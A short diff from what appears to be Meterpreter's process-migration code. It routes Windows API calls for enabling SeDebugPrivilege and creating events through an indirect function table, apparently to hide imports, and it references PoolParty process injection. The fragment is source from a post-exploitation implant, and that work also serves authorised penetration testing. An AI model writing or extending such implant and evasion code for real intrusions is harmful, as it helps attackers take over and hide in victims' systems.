@@ -426,16 +426,16 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		bPoolParty = supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch);
 
-		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+		if (met_api->win_api.advapi32.OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 		{
 			TOKEN_PRIVILEGES priv = { 0 };
 
 			priv.PrivilegeCount = 1;
 			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+			if (met_api->win_api.advapi32.LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &priv.Privileges[0].Luid))
 			{
-				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
+				if (met_api->win_api.advapi32.AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
 				{
 					dprintf("[MIGRATE] Got SeDebugPrivilege!");
 				}
@@ -476,7 +476,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		// Create a notification event that we'll use to know when it's safe to exit
 		// (once the socket has been referenced in the other process)
-		hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+		hEvent = met_api->win_api.kernel32.CreateEventA(NULL, TRUE, FALSE, NULL);
 		if (!hEvent)
 		{
 			BREAK_ON_ERROR("[MIGRATE] CreateEvent failed");
